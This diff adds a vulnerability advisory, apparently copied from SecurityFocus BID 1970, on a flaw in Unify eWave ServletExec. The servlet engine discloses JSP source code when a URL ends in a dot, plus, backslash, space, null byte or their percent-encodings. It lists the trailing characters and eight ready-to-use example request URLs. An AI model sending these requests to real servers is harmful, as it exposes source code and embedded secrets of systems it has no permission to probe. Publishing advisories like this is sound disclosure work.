@@ -1,0 +1,30 @@
+source : http://www.securityfocus.com/bid/1970/info
+
+Unify eWave ServletExec is a Java/Java Servlet engine plug-in for major web servers such as Microsoft IIS, Apache, Netscape Enterprise Server, etc. 
+
+ServletExec will return the source code of JSP files when a HTTP request is appended with one of the following characters:
+
+.
+%2E
++
+%2B
+%5C
+%20
+%00
+
+For example, the following URL will yield the source of the specified JSP file:
+
+http://target/directory/jsp/file.jsp.
+
+Successful exploitation could lead to the disclosure of sensitive information contained within JSP pages.
+
+Any of the following URL requests will yield the source of the specified JSP file:
+
+http://target/directory/jsp/file.jsp. 
+http://target/directory/jsp/file.jsp%2E
+http://target/directory/jsp/file.jsp+ 
+http://target/directory/jsp/file.jsp%2B
+http://target/directory/jsp/file.jsp\ 
+http://target/directory/jsp/file.jsp%5C
+http://target/directory/jsp/file.jsp%20 
+http://target/directory/jsp/file.jsp%00
